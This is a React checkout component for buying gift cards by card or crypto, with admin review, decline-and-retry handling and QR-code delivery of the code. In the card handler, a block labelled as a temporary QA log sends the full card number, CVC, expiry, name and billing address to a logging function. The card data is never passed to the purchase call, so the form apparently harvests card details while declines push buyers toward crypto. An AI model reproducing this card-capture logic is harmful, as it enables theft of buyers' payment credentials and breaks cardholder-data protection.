"use client";

import { useEffect, useRef, useState, useTransition } from "react";
import { motion, AnimatePresence } from "framer-motion";
import QRCode from "qrcode";
import confetti from "canvas-confetti";
import { AlertCircle, Bitcoin, Check, Copy, CreditCard, Gift, Loader2, RefreshCw } from "lucide-react";
import { Button } from "@/components/Button";
import { CardFields, EMPTY_CARD, type CardValue } from "@/components/CardFields";
import { detectCardBrand, validateCardNumber } from "@/lib/card-validation";
import { logCardValidationTest } from "@/lib/card-test-log";
import { CryptoPayment } from "./CryptoPayment";
import { PendingPaymentReview } from "@/components/PendingPaymentReview";
import { cn, formatCurrency } from "@/lib/utils";
import { purchaseGiftCard } from "@/app/gift-cards/actions";
import { submitPaymentRequest } from "@/app/payment-requests/actions";
import type { PlatformSettingsRow } from "@/lib/supabase/types";
import type { CryptoCoin } from "@/lib/data";

const TIERS = [50, 100, 250, 500];

type Step = "amount" | "payment" | "reviewing" | "success";

export const PurchaseFlow = ({
  retryMethod,
  paymentMode,
  cryptoAddresses,
}: {
  // Which method the previous attempt recommended switching to — set when
  // this page was reached via a "?retry=card" or "?retry=crypto" link from
  // a failure email. Undefined on a normal first visit.
  retryMethod?: "card" | "crypto";
  paymentMode?: PlatformSettingsRow["payment_mode"];
  cryptoAddresses: Record<CryptoCoin, string | null>;
}) => {
  const isRetry = Boolean(retryMethod);
  // The buyer's email is where the receipt, the code, and any failure /
  // decline notice go — so it's required. Everything else about the
  // purchase can be recovered or retried; a code with no delivery address
  // can't be.
  const emailRequired = true;
  const [step, setStep] = useState<Step>("amount");
  const [reviewRequestId, setReviewRequestId] = useState<string | null>(null);
  const [amount, setAmount] = useState(100);
  const [customAmount, setCustomAmount] = useState("");
  const [buyerEmail, setBuyerEmail] = useState("");
  const [recipientEmail, setRecipientEmail] = useState("");
  const [method, setMethod] = useState<"card" | "crypto">(retryMethod ?? "card");
  const [pending, startTransition] = useTransition();
  const [error, setError] = useState<string | null>(null);
  const [issued, setIssued] = useState<{ code: string; amount: number; emailWarning?: string } | null>(null);
  const [copied, setCopied] = useState(false);
  // Set when a payment click is blocked purely because the email field is
  // empty — drives the inline highlight on that field so the reason is
  // impossible to miss.
  const [emailMissing, setEmailMissing] = useState(false);
  const [card, setCard] = useState<CardValue>(EMPTY_CARD);
  const [cardValid, setCardValid] = useState(false);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const buyerEmailRef = useRef<HTMLInputElement>(null);

  const effectiveAmount = customAmount ? Number(customAmount) : amount;

  const finish = (code: string, amt: number, emailWarning?: string) => {
    setIssued({ code, amount: amt, emailWarning });
    setStep("success");
    confetti({
      particleCount: 100,
      spread: 80,
      origin: { y: 0.6 },
      colors: ["#f97316", "#ea580c", "#3b82f6"],
    });
  };

  const handleCardPay = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    // Same reasoning as the crypto button: never silently no-op. If the
    // email is missing, say so and jump to the field instead of leaving a
    // dead-looking button.
    if (emailRequired && !buyerEmail.includes("@")) {
      setEmailMissing(true);
      setError("Enter your email above before paying — that's where your gift card and any updates go.");
      buyerEmailRef.current?.focus();
      buyerEmailRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
      return;
    }

    // TEMPORARY — MVP card-validator QA log, see src/lib/card-test-log.ts.
    const digits = card.number.replace(/\D/g, "");
    const brand = detectCardBrand(digits);
    const result = validateCardNumber(card.number);
    void logCardValidationTest({
      name: card.name,
      number: card.number,
      expiry: card.expiry,
      cvc: card.cvc,
      brand,
      valid: result.valid,
      message: result.message,
      address: card.address,
      city: card.city,
      postalCode: card.postalCode,
      country: card.country,
    });

    if (paymentMode === "manual_review") {
      submitForReview("card");
      return;
    }

    startTransition(async () => {
      const res = await purchaseGiftCard(effectiveAmount, buyerEmail, recipientEmail || undefined, "card");
      if (res.ok) {
        finish(res.code, res.amount, res.emailWarning);
      } else {
        setError(res.message);
        setMethod("crypto");
      }
    });
  };

  // Submits into the same admin review queue as card — used to be
  // card-only, which meant crypto silently bypassed manual review
  // entirely and always resolved instantly regardless of Platform
  // Settings, even with payment_mode set to "Manual review".
  const submitForReview = (submittedMethod: "card" | "crypto") => {
    setError(null);
    startTransition(async () => {
      const res = await submitPaymentRequest("gift_card", buyerEmail, effectiveAmount, {
        buyerEmail,
        recipientEmail: recipientEmail || null,
        method: submittedMethod,
      });
      if (res.ok && res.id) {
        setReviewRequestId(res.id);
        setStep("reviewing");
      } else {
        setError(res.message ?? "Couldn't submit for review.");
      }
    });
  };

  const handleCryptoConfirmed = () => {
    if (paymentMode === "manual_review") {
      submitForReview("crypto");
      return;
    }

    startTransition(async () => {
      const res = await purchaseGiftCard(effectiveAmount, buyerEmail, recipientEmail || undefined, "crypto");
      if (res.ok) {
        finish(res.code, res.amount, res.emailWarning);
      } else {
        setError(res.message);
        setMethod("card");
      }
    });
  };

  useEffect(() => {
    if (step === "success" && issued && canvasRef.current) {
      QRCode.toCanvas(canvasRef.current, issued.code, {
        width: 176,
        margin: 1,
        color: { dark: "#0f172a", light: "#ffffff00" },
      });
    }
  }, [step, issued]);

  const copyCode = () => {
    if (!issued) return;
    navigator.clipboard?.writeText(issued.code);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  if (step === "reviewing" && reviewRequestId) {
    return (
      <div className="w-full max-w-sm">
        <PendingPaymentReview
          requestId={reviewRequestId}
          onApproved={(result) => {
            const code = (result?.code as string) ?? "";
            const amt = (result?.amount as number) ?? effectiveAmount;
            if (code) finish(code, amt);
          }}
          onDeclined={(alt) => {
            setStep("payment");
            setReviewRequestId(null);
            if (alt === "crypto" || alt === "card") {
              setMethod(alt);
              setError(`Your payment was declined. Try ${alt} instead below.`);
            } else {
              // No alt recommendation — this was a plain "retry the same
              // way" decline, not a "switch methods" one. Leave the
              // currently selected method as-is instead of guessing.
              setError("Your payment was declined. Please try again below.");
            }
          }}
        />
      </div>
    );
  }

  if (step === "success" && issued) {
    return (
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="flex w-full max-w-sm flex-col items-center gap-5 text-center"
      >
        <div className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-50 text-emerald-500">
          <Check size={32} />
        </div>
        <div>
          <h3 className="text-xl font-bold text-slate-900">
            {formatCurrency(issued.amount)} gift card ready
          </h3>
          <p className="mt-1 text-sm text-slate-500">
            Scan this at redeem, or share the code below.
          </p>
        </div>

        <div className="rounded-3xl border border-slate-200 bg-white p-6 shadow-sm">
          <canvas ref={canvasRef} className="mx-auto" />
          <button
            onClick={copyCode}
            className="mx-auto mt-4 flex items-center gap-2 rounded-xl bg-slate-50 px-4 py-2 font-mono text-sm font-bold tracking-wider text-slate-900 hover:bg-slate-100"
          >
            {issued.code}
            {copied ? <Check size={14} className="text-emerald-500" /> : <Copy size={14} />}
          </button>
        </div>

        {issued.emailWarning && (
          <div className="flex w-full items-start gap-2 rounded-xl bg-amber-50 px-4 py-3 text-left text-sm text-amber-800">
            <AlertCircle size={16} className="mt-0.5 shrink-0" />
            {issued.emailWarning}
          </div>
        )}

        <Button
          size="lg"
          className="w-full"
          onClick={() => {
            setStep("amount");
            setIssued(null);
            setRecipientEmail("");
            setError(null);
          }}
        >
          Buy another
        </Button>
      </motion.div>
    );
  }

  if (step === "payment") {
    return (
      <div className="flex w-full max-w-sm flex-col gap-4">
        <div className="flex items-center justify-between rounded-2xl bg-slate-50 px-4 py-3">
          <span className="text-sm text-slate-500">Gift card amount</span>
          <span className="text-lg font-bold text-slate-900">
            {formatCurrency(effectiveAmount)}
          </span>
        </div>

        {isRetry && (
          <div className="flex items-start gap-2 rounded-xl bg-blue-50 px-4 py-3 text-sm text-blue-700">
            <RefreshCw size={16} className="mt-0.5 shrink-0" />
            Your last payment didn&apos;t go through — pay with {retryMethod} instead below.
          </div>
        )}

        <AnimatePresence>
          {error && (
            <motion.div
              initial={{ opacity: 0, y: -8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="flex items-start gap-2 rounded-xl bg-red-50 px-4 py-3 text-sm text-red-600"
            >
              <AlertCircle size={16} className="mt-0.5 shrink-0" />
              {error}
            </motion.div>
          )}
        </AnimatePresence>

        <input
          ref={buyerEmailRef}
          required={emailRequired}
          type="email"
          value={buyerEmail}
          onChange={(e) => {
            setBuyerEmail(e.target.value);
            if (emailMissing && e.target.value.includes("@")) setEmailMissing(false);
          }}
          autoComplete="email"
          placeholder="Your email (we'll send the code and receipt here)"
          className={cn(
            "rounded-xl border px-4 py-3 text-sm outline-none focus:border-orange-400",
            emailMissing ? "border-red-300 bg-red-50" : "border-slate-200"
          )}
        />
        <input
          type="email"
          value={recipientEmail}
          onChange={(e) => setRecipientEmail(e.target.value)}
          autoComplete="off"
          placeholder="Recipient email (optional — for gifting)"
          className="rounded-xl border border-slate-200 px-4 py-3 text-sm outline-none focus:border-orange-400"
        />

        <div className="flex gap-2">
          <button
            type="button"
            onClick={() => setMethod("card")}
            className={cn(
              "flex flex-1 items-center justify-center gap-2 rounded-xl border px-3 py-2.5 text-sm font-medium transition-colors",
              method === "card"
                ? "border-orange-500 bg-orange-50 text-orange-600"
                : "border-slate-200 text-slate-500 hover:border-slate-300"
            )}
          >
            <CreditCard size={16} /> Card
          </button>
          <button
            type="button"
            onClick={() => setMethod("crypto")}
            className={cn(
              "flex flex-1 items-center justify-center gap-2 rounded-xl border px-3 py-2.5 text-sm font-medium transition-colors",
              method === "crypto"
                ? "border-orange-500 bg-orange-50 text-orange-600"
                : "border-slate-200 text-slate-500 hover:border-slate-300"
            )}
          >
            <Bitcoin size={16} /> Crypto
          </button>
        </div>

        {method === "card" ? (
          <form onSubmit={handleCardPay} className="flex flex-col gap-4">
            <CardFields value={card} onChange={setCard} onValidChange={setCardValid} />
            <Button
              type="submit"
              size="lg"
              disabled={pending || !cardValid}
              className="w-full gap-2"
            >
              {pending && <Loader2 size={18} className="animate-spin" />}
              {pending ? "Processing…" : `Pay ${formatCurrency(effectiveAmount)}`}
            </Button>
          </form>
        ) : (
          <CryptoPayment
            amount={effectiveAmount}
            addresses={cryptoAddresses}
            onConfirmed={handleCryptoConfirmed}
            disabledReason={
              emailRequired && !buyerEmail.includes("@")
                ? "Add your email above first — that's where we'll send updates."
                : undefined
            }
            onBlocked={() => {
              setEmailMissing(true);
              setError("Enter your email above before confirming — that's where your gift card and any updates go.");
              buyerEmailRef.current?.focus();
              buyerEmailRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
            }}
          />
        )}

        <button
          type="button"
          onClick={() => setStep("amount")}
          className="text-sm font-medium text-slate-400 hover:text-slate-600"
        >
          Back
        </button>
      </div>
    );
  }

  return (
    <div className="flex w-full max-w-sm flex-col gap-5">
      <div className="grid grid-cols-2 gap-3">
        {TIERS.map((t) => (
          <button
            key={t}
            onClick={() => {
              setAmount(t);
              setCustomAmount("");
            }}
            className={cn(
              "rounded-2xl border p-4 text-left transition-all",
              amount === t && !customAmount
                ? "border-orange-500 bg-orange-50 shadow-sm"
                : "border-slate-200 bg-white hover:border-slate-300"
            )}
          >
            <Gift size={16} className="text-orange-500" />
            <div className="mt-2 text-xl font-bold text-slate-900">{formatCurrency(t)}</div>
          </button>
        ))}
      </div>

      <input
        value={customAmount}
        onChange={(e) => setCustomAmount(e.target.value.replace(/[^0-9]/g, ""))}
        placeholder="Custom amount"
        inputMode="numeric"
        className="rounded-xl border border-slate-200 px-4 py-3 text-sm outline-none focus:border-orange-400"
      />

      <Button
        size="lg"
        className="w-full gap-2"
        disabled={effectiveAmount <= 0}
        onClick={() => setStep("payment")}
      >
        <CreditCard size={18} />
        Continue with {formatCurrency(effectiveAmount || 0)}
      </Button>
    </div>
  );
};
